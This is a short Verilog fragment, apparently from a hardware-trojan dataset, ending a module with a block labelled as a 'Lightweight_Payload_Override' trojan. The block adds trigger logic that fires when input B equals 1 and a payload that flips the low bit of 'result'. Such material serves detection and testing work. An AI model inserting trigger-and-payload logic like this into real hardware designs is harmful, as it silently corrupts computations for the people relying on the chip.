// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [1:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (B == 3'h1);
    htrojan_pay = htrojan_trig ? (result ^ 2'h1) : result;
end
// HT_END
endmodule
